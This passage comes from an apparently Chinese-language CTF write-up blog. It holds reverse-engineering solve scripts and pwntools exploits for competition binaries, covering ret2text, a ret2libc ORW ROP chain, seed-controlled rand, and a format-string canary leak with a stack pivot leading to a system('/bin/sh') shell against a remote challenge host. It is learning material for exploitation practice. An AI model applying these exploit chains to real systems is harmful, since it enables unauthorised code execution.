class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;A&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-built_in">ord</span>(i) &gt; <span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;Z&quot;</span>):<br>        flag.append(i)<br>        j+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">continue</span><br>    o = <span class="hljs-built_in">ord</span>(i)-<span class="hljs-built_in">ord</span>(key[j%<span class="hljs-number">5</span>])<br>    <br>    o = o%<span class="hljs-number">26</span> + <span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;A&quot;</span>)<br>    <span class="hljs-built_in">print</span>(o)<br>    flag.append(<span class="hljs-built_in">chr</span>(o))<br>    j+=<span class="hljs-number">1</span><br>    <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(flag))<br></code></pre></td></tr></table></figure><h4 id="你知道-elf文件嘛"><a href="#你知道-elf文件嘛" class="headerlink" title="你知道.elf文件嘛"></a>你知道.elf文件嘛</h4><p>拖进IDA发现竟然全是LOAD段，无从下手，干脆先随便执行一下算了……执行后发现只要按要求输入base64码表即可get flag。<br><img src="/wpsrc/re02.png" alt="alt text"></p><h4 id="《回忆安魂曲》–第二章：当记忆被割裂"><a href="#《回忆安魂曲》–第二章：当记忆被割裂" class="headerlink" title="《回忆安魂曲》–第二章：当记忆被割裂"></a>《回忆安魂曲》–第二章：当记忆被割裂</h4><p>拖进IDA尝试F5反编译，几乎所有函数都飘红冒出JUMPOUT，显然是花指令。观察发现程序实际上是<strong>把地址加载到栈上</strong>，再利用复杂的指令进行<code>jmp rax</code>跳转。尝试nop+patch恢复似乎没什么卵用，毕竟栈帧调用及其费解，难以恢复正常。<br>做这题的是pwn手，于是在IDA调试没出什么成果的情况下果断采用pwndbg调试，终于缕清了程序逻辑：<br><img src="/wpsrc/re3.png"><br>发现数据段上有ans和key，基本上就是<code>answer</code>和<code>key</code>了。利用pwndbg逐步审计汇编代码，发现程序的加密函数enc逻辑如下：</p><ol><li>设当前字符为<code>now</code>,索引为<code>i</code></li><li>now ^&#x3D; (0x66+i)</li><li>now ^&#x3D; 0x52</li><li>now +&#x3D; 6</li><li>now ^&#x3D; (key[i]+i)</li></ol><p>缕清了加密逻辑、找到了密文和密钥之后，解密就不难了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs Python">ans = <span class="hljs-string">b&quot;\xea\x0c\x1a\x11\xf6\x2c\x1d\x3e\x17\x35&quot;</span> \<br>      <span class="hljs-string">b&quot;\x29\xf4\x39\x39\xd3&quot;</span> \<br>      <span class="hljs-string">b&quot;\xc3\x2d\x00\x10\x30\x3d\xcc\x00\xd3\xc0&quot;</span> \<br>      <span class="hljs-string">b&quot;\x4b\xc6\x11\xc7\x29\x3e&quot;</span> \<br>      <span class="hljs-string">b&quot;\xba\x60\x90\x34&quot;</span><br>      <br>key = <span class="hljs-string">b&quot;i_can_reverse_but_i_can_not_have_you&quot;</span><br>l = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(key)):<br>    now = ans[i]^(key[i]+i)<br>    now -= <span class="hljs-number">6</span><br>    now ^=<span class="hljs-number">0x52</span><br>    now ^= (<span class="hljs-number">0x66</span>+i)<br>    now %=<span class="hljs-number">128</span><br>    l.append(<span class="hljs-built_in">chr</span>(now))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(l))<br></code></pre></td></tr></table></figure><h4 id="《回忆安魂曲》–第三章：逃不出的黑墙"><a href="#《回忆安魂曲》–第三章：逃不出的黑墙" class="headerlink" title="《回忆安魂曲》–第三章：逃不出的黑墙"></a>《回忆安魂曲》–第三章：逃不出的黑墙</h4><p>迷宫<del>饭</del>题，先从IDA中把迷宫提出来，再让AI写个BFS脚本查路径就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs Python">puzzle = [<br>    <span class="hljs-string">&quot;###############################P#...............#...#.......#.###&quot;</span>,<br>    <span class="hljs-string">&quot;##.###.#####.#.###.#####.#.....#...#.#.....#...#.#...#.#####.#.##&quot;</span>,<br>    <span class="hljs-string">&quot;#.#.#######.#.#.###.#C..#.#.#...#.#...#...#.#.#...#.#.#.#.#.###.#&quot;</span>,<br>    <span class="hljs-string">&quot;.#.#.###.#.#.#.#.#.#.#.#...#...#.#.......#.#.#.###.#.###.#####.##&quot;</span>,<br>    <span class="hljs-string">&quot;#######.###.#...#...#.....#.#.......#...#.#.#####.#####.#.#.#####&quot;</span>,<br>    <span class="hljs-string">&quot;.###.#...#...#...#...#...#...#.#...#.###.#.###.#.#######.#.#.#.#.&quot;</span>,<br>    <span class="hljs-string">&quot;#...#.#.#...#.#...#...#...#.#.###.#.#.#####.#.#.#.#######.###.#..&quot;</span>,<br>    <span class="hljs-string">&quot;.#.....#...#.#.#...#.....#.#########.#####.#.###.#.###.#.#.....#.&quot;</span>,<br>    <span class="hljs-string">&quot;#...#...#...#...#.#.#.#.#.#.#.###.#.#####.###.#.#.#...#.#...#.#..&quot;</span>,<br>    <span class="hljs-string">&quot;.#...#...#...#.#.###.###.#.#####.#.###.###.#.#...#.#.#.......#.#.&quot;</span>,<br>    <span class="hljs-string">&quot;..#.#...#.#####.#.#######.#.#####.#.###.#...#.#.......#.#...#...#&quot;</span>,<br>    <span class="hljs-string">&quot;.#..E#.#.#.#.#######.###.#.#####.#.#.#...#.............#.....#.#.&quot;</span>,<br>    <span class="hljs-string">&quot;#.###############.#######.#.#.#.........#...#...#.....#...#.#.###&quot;</span>,<br>    <span class="hljs-string">&quot;####.#.#.#####.#.#######.#.......#...#.......#.........&quot;</span><br>]<br>puzzle = <span class="hljs-string">&quot;&quot;</span>.join(puzzle)<br>p = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(puzzle), <span class="hljs-number">30</span>):<br>    p.append(<span class="hljs-built_in">list</span>(puzzle[i:i+<span class="hljs-number">30</span>]))<br>    <br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> p:<br>    <span class="hljs-built_in">print</span>(j)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">##############################</span><br><span class="hljs-string">#P#...............#...#.......</span><br><span class="hljs-string">#.#####.###.#####.#.###.#####.</span><br><span class="hljs-string">#.....#...#.#.....#...#.#...#.</span><br><span class="hljs-string">#####.#.###.#.#######.#.#.###.</span><br><span class="hljs-string">#...#.#.#...#.#...#...#.#.#...</span><br><span class="hljs-string">#.#.#.#.#.###.#.#.#.###.#.#.#.</span><br><span class="hljs-string">#.#.#.#.#...#...#.#.......#.#.</span><br><span class="hljs-string">#.###.#.###.#####.#########.##</span><br><span class="hljs-string">#.#...#...#.....#.#.......#...</span><br><span class="hljs-string">#.#.#####.#####.#.#.#####.###.</span><br><span class="hljs-string">#...#...#...#...#...#...#.#...</span><br><span class="hljs-string">#.###.#.###.#.#######.#.#.#.#.</span><br><span class="hljs-string">#...#.#.#...#.#...#...#...#.#.</span><br><span class="hljs-string">###.#.#.#####.#.#.#.#######.##</span><br><span class="hljs-string">#.#...#.....#...#.#.#...#.....</span><br><span class="hljs-string">#.#########.#####.#.###.#.###.</span><br><span class="hljs-string">#.#.....#.#...#...#...#...#.#.</span><br><span class="hljs-string">#.#.#.#.#.###.#.#####.###.#.#.</span><br><span class="hljs-string">#...#.#...#.#...#...#...#...#.</span><br><span class="hljs-string">#.###.###.#.#####.#.###.###.#.</span><br><span class="hljs-string">#...#.#.#.......#.#...#.#...#.</span><br><span class="hljs-string">#####.#.#######.#.#####.#.###.</span><br><span class="hljs-string">#...#.#.......#.#...#...#.#..E</span><br><span class="hljs-string">#.#.#.#.#######.###.#.#####.#.</span><br><span class="hljs-string">#.#...#.............#.....#.#.</span><br><span class="hljs-string">#.###############.#######.#.#.</span><br><span class="hljs-string">#.........#...#...#.....#...#.</span><br><span class="hljs-string">#.#######.#.#.#####.#.#######.</span><br><span class="hljs-string">#.......#...#.......#.........</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> deque<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve</span>(<span class="hljs-params">l, startX, startY, row, col</span>):<br>    <span class="hljs-comment"># 定义方向向量，上下左右分别为 w, s, a, d</span><br>    directions = &#123;<span class="hljs-string">&#x27;l&#x27;</span>: (-<span class="hljs-number">1</span>, <span class="hljs-number">0</span>), <span class="hljs-string">&#x27;o&#x27;</span>: (<span class="hljs-number">1</span>, <span class="hljs-number">0</span>), \<br>        <span class="hljs-string">&#x27;v&#x27;</span>: (<span class="hljs-number">0</span>, -<span class="hljs-number">1</span>), <span class="hljs-string">&#x27;e&#x27;</span>: (<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)&#125;<br>    <span class="hljs-comment"># 初始化队列</span><br>    queue = deque([(startX, startY, <span class="hljs-string">&quot;&quot;</span>)])  <span class="hljs-comment"># 存储坐标和路径</span><br>    visited = <span class="hljs-built_in">set</span>((startX, startY))  <span class="hljs-comment"># 记录访问过的节点</span><br>    <br>    <span class="hljs-comment"># BFS 遍历</span><br>    <span class="hljs-keyword">while</span> queue:<br>        x, y, path = queue.popleft()<br>        <br>        <span class="hljs-comment"># 如果到达终点</span><br>        <span class="hljs-keyword">if</span> l[x][y] == <span class="hljs-string">&#x27;E&#x27;</span>:<br>            <span class="hljs-keyword">return</span> path<br>        <br>        <span class="hljs-comment"># 遍历四个方向</span><br>        <span class="hljs-keyword">for</span> direction, (dx, dy) <span class="hljs-keyword">in</span> directions.items():<br>            nx, ny = x + dx, y + dy<br>            <br>            <span class="hljs-comment"># 检查边界和是否已访问以及是否为墙</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-number">0</span> &lt;= nx &lt; row <span class="hljs-keyword">and</span> <span class="hljs-number">0</span> &lt;= ny &lt; \<br>                col <span class="hljs-keyword">and</span> (nx, ny) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> \<br>                    visited <span class="hljs-keyword">and</span> l[nx][ny] != <span class="hljs-string">&#x27;#&#x27;</span>:<br>                visited.add((nx, ny))<br>                queue.append((nx, ny, path + direction))<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No path found&quot;</span><br><br>    <br><span class="hljs-built_in">print</span>(solve(p, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">30</span> ,<span class="hljs-number">30</span>))<br></code></pre></td></tr></table></figure><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h4 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h4><p>nc就给flag，甚至不用cat。哪怕是签到题也显得过于简单了。</p><h4 id="girlfriend"><a href="#girlfriend" class="headerlink" title="girlfriend"></a>girlfriend</h4><p>普通的ret2text，给了后门函数，数组索引越界。需要注意的是溢出会覆盖i，i的值必须精心布置才行；另外要ret到那个lea指令处，防止栈不对齐导致错误。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main&quot;&quot;&quot;)</span><br>io = remote(<span class="hljs-string">&quot;27.25.151.12&quot;</span>,<span class="hljs-number">20162</span>)<br><br>io.sendafter(<span class="hljs-string">b&quot;first i need your team id\n&quot;</span>, <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">40</span> + <span class="hljs-string">b&quot;admin\x00&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    io.sendlineafter(<span class="hljs-string">b&quot;birthday\n&quot;</span>, <span class="hljs-string">b&quot;5&quot;</span>)<br>    <br>    <br>io.sendlineafter(<span class="hljs-string">b&quot;birthday\n&quot;</span>, <span class="hljs-string">b&quot;4198942&quot;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure><h4 id="ret2orw"><a href="#ret2orw" class="headerlink" title="ret2orw"></a>ret2orw</h4><p>板子题，开了沙箱禁用<code>execve</code>，用ret2libc同款手法打orw即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>puts_plt = e.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_got = e.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>pop_rdi = <span class="hljs-number">0x4012ce</span><br>ret = pop_rdi + <span class="hljs-number">1</span><br>main = <span class="hljs-number">0x4012a1</span><br>bss = <span class="hljs-number">0x4040a0</span><br>flag = bss + <span class="hljs-number">0x100</span><br><br><span class="hljs-built_in">print</span>(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./flag&quot;</span>))<br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span><br><span class="hljs-comment">#                b vuln</span><br><span class="hljs-comment">#                &quot;&quot;&quot;)</span><br>io = remote(<span class="hljs-string">&quot;27.25.151.12&quot;</span>,<span class="hljs-number">20347</span>)<br>get_libc = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">32</span> + <span class="hljs-string">b&quot;b&quot;</span>*<span class="hljs-number">8</span> + p64(pop_rdi) + p64(puts_got) \<br>    + p64(puts_plt) + p64(main)<br>io.sendafter(<span class="hljs-string">b&quot;oh,what&#x27;s this?\n&quot;</span>, get_libc)<br>puts_addr = u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br>open_addr = libc_base + libc.sym[<span class="hljs-string">&quot;open&quot;</span>]<br>read_addr = libc_base + libc.sym[<span class="hljs-string">&quot;read&quot;</span>]<br>pop_rsi = libc_base + <span class="hljs-number">0x2be51</span><br>pop_rdx = libc_base + <span class="hljs-number">0x11f2e7</span><br><br><br>payload = <span class="hljs-string">b&quot;c&quot;</span>*<span class="hljs-number">32</span> + <span class="hljs-string">b&quot;d&quot;</span>*<span class="hljs-number">8</span><br>payload += p64(pop_rsi) + p64(bss) + p64(read_addr)<br>payload += p64(pop_rdi) + p64(bss) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) +\<br>     p64(pop_rdx) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)+ p64(open_addr)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + \<br>    p64(flag) + p64(pop_rdx) + p64(<span class="hljs-number">0x100</span>) + p64(<span class="hljs-number">0</span>)+ p64(read_addr)<br>payload += p64(pop_rdi) + p64(flag) + p64(puts_addr)<br><br>io.send(payload)<br>pause()<br>io.send(<span class="hljs-string">&quot;./flag&quot;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure><h4 id="ez-game"><a href="#ez-game" class="headerlink" title="ez_game"></a>ez_game</h4><p>普通的打随机数，好处是可以栈溢出控制seed，不会有远程和本地时间差导致的错误。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br>sh = <span class="hljs-number">0x4012fc</span><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br>io = remote(<span class="hljs-string">&quot;27.25.151.12&quot;</span>, <span class="hljs-number">33258</span>)<br>lib = cdll.LoadLibrary(<span class="hljs-string">&quot;libc.so.6&quot;</span>)<br><br>io.sendlineafter(<span class="hljs-string">b&quot;Enter your username: &quot;</span>, <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">400</span> + p64(<span class="hljs-number">0</span>))<br><br>lib.srand(<span class="hljs-number">0</span>) <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>():<br>    res = lib.rand()<br>    <span class="hljs-keyword">if</span> res &lt; <span class="hljs-number">0</span>:<br>        res %= <span class="hljs-number">7</span><br>        res -= <span class="hljs-number">7</span><br>        res += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        res %= <span class="hljs-number">7</span><br>        res += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(res).encode()<br><br> <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20001</span>):<br>    io.sendline(r())<br>    <br>io.interactive()<br></code></pre></td></tr></table></figure><h4 id="0verf10w"><a href="#0verf10w" class="headerlink" title="0verf10w"></a>0verf10w</h4><p>非常恶心，格串+canary绕过+ret2libc+栈迁移。首先利用格串漏洞把程序基地址、libc基地址、栈地址、canary值全部leak出来，此时main函数的canary已损坏，不过我们一会儿可以打栈迁移绕过检查，不必理会；接下来利用vuln函数里的off-by-one，覆盖rbp指向的位置的低字节，实现栈迁移，这样就可以劫持控制流重启main了。接下来就常规ret2libc打通即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span><br><span class="hljs-comment">#                b vuln</span><br><span class="hljs-comment">#                &quot;&quot;&quot;)</span><br>io = remote(<span class="hljs-string">&quot;27.25.151.12&quot;</span>, <span class="hljs-number">26250</span>)<br><br>io.sendlineafter(<span class="hljs-string">b&quot;By the way, can you tell me your name before that?\n&quot;</span>, <span class="hljs-string">b&quot;a&quot;</span>)<br>get_canary = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">8</span> + <span class="hljs-string">b&quot;%29$p&quot;</span> + <span class="hljs-string">b&quot;%15$p&quot;</span> + <span class="hljs-string">b&quot;%13$p&quot;</span> + <span class="hljs-string">b&quot;%11$p&quot;</span> + <span class="hljs-string">b&quot;0x\x00&quot;</span><br>io.sendafter(<span class="hljs-string">b&quot;Great, I&#x27;ve decided to give you a gift!\n&quot;</span>, get_canary)<br>io.recvuntil(<span class="hljs-string">b&quot;0x&quot;</span>)<br>canary = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&quot;0x&quot;</span>)[:-<span class="hljs-number">2</span>].decode(), <span class="hljs-number">16</span>)<br>log.success(<span class="hljs-string">f&quot;canary&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(canary)&#125;</span>&quot;</span>)<br>stack = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&quot;0x&quot;</span>)[:-<span class="hljs-number">2</span>].decode(), <span class="hljs-number">16</span>) - <span class="hljs-number">0x160</span><br>log.success(<span class="hljs-string">f&quot;stack&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(stack)&#125;</span>&quot;</span>)<br>main = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&quot;0x&quot;</span>)[:-<span class="hljs-number">2</span>].decode(), <span class="hljs-number">16</span>)<br>log.success(<span class="hljs-string">f&quot;main&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(main)&#125;</span>&quot;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&quot;0x&quot;</span>)[:-<span class="hljs-number">2</span>].decode(), <span class="hljs-number">16</span>) <br>log.success(<span class="hljs-string">f&quot;libc_start&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)<br><br>libc_base = libc_base - libc.sym[<span class="hljs-string">&quot;__libc_start_main&quot;</span>]-<span class="hljs-number">128</span>+<span class="hljs-number">176</span><br>puts_addr = libc_base + libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br>system_addr = libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>binsh_addr = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br>pop_rdi = libc_base + <span class="hljs-number">0x2a3e5</span><br>ret = pop_rdi+<span class="hljs-number">1</span><br>log.success(<span class="hljs-string">f&quot;libc_base&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)<br>log.success(<span class="hljs-string">f&quot;puts&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(puts_addr)&#125;</span>&quot;</span>)<br>off = stack&amp;<span class="hljs-number">0xff</span><br><br><br>payload1 = p64(canary) + <span class="hljs-string">b&quot;e&quot;</span>*<span class="hljs-number">8</span> + p64(main) + p64(canary) + p8(off)<br>io.recvuntil(<span class="hljs-string">b&quot;again?????\n&quot;</span>)<br>sleep(<span class="hljs-number">3</span>)<br>io.send(payload1)<br><br><br>payload2 = <span class="hljs-string">b&quot;c&quot;</span>*(<span class="hljs-number">0x14</span>-<span class="hljs-number">0x8</span>)<br>payload2 += p64(canary)+ <span class="hljs-string">b&quot;d&quot;</span>*<span class="hljs-number">8</span> \<br>+ p64(pop_rdi) + p64(binsh_addr) + p64(ret) + p64(system_addr)<br>io.sendlineafter(<span class="hljs-string">b&quot;By the way, can you tell me your name before that?\n&quot;</span>, \<br>    payload2)<br>io.sendafter(<span class="hljs-string">b&quot;Great, I&#x27;ve decided to give you a gift!\n&quot;</span>, <span class="hljs-string">b&quot;a&quot;</span>)<br>io.sendafter(<span class="hljs-string">b&quot;again?????\n&quot;</span>, <span class="hljs-string">b&quot;a&quot;</span>)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h4 id="orange"><a href="#orange" class="headerlink" 